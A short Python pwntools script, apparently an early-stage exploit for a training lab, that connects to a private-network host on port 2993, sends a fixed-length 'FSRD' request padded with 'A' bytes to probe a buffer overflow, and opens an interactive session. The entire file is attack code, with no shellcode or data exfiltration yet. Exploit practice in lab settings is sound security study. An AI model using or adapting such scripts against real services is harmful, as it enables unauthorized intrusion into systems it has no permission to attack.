#!/usr/bin/env python3
from pwn import *
context.update(arch='i386', os='linux')
context.bits =32

context.log_level = 'info'
log.info('Executing exploit')
io = remote('192.168.12.128', 2993)

startSequence = b"FSRD"
endSequence = b"/"
requestLen = 128
#body = b'A'*(requestLen-len(startSequence)-len(endSequence))
body = b'A'*123
payload = startSequence + body + endSequence
io.sendline(payload)
print(payload)
print(io.recvlineS())
io.interactive()
io.close()

